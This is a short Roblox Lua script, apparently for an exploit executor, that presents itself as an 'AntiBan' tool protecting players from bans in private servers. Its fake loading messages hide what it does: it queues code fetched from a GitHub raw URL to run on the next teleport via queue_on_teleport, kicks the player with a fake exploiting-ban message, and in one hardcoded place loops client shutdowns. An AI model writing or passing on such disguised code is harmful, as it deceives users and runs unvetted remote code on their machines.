repeat task.wait() until game:IsLoaded()

task.wait(1.5)

local me = game.Players.LocalPlayer
local TeleportService = game:GetService("TeleportService")
local Players = game:GetService("Players")

local samKalishia = 132059917051749

if game.PlaceId == samKalishia then
   
   while true do
	 game:Shutdown()
		me:Kick("ROBLOX ToS Violation(s): Exploiting. - Unappealable!")  
	 wait(0.1)
   end
    
    return
end

-- script continues here if PlaceId is NOT samKalishia

wait(1)
warn("AntiBan: Hooked to required stuff")

wait(1)
warn("AntiBan: Loading .. .. ")

repeat task.wait() until game:IsLoaded()

task.wait(1)
warn("AntiBan: loaded! You can now not be banned in Private Servers!")

if syn and syn.queue_on_teleport then
    syn.queue_on_teleport(game:HttpGet("https://raw.githubusercontent.com/CryWinkleSam/get/refs/heads/main/305.lua"))
elseif queue_on_teleport then
    queue_on_teleport(game:HttpGet("https://raw.githubusercontent.com/CryWinkleSam/get/refs/heads/main/305.lua"))
end

me:Kick("ROBLOX ToS Violation(s): Exploiting. - If you think this is a mistake, Visit our website to appeal.")

wait(3)
--TeleportService:Teleport(samKalishia)
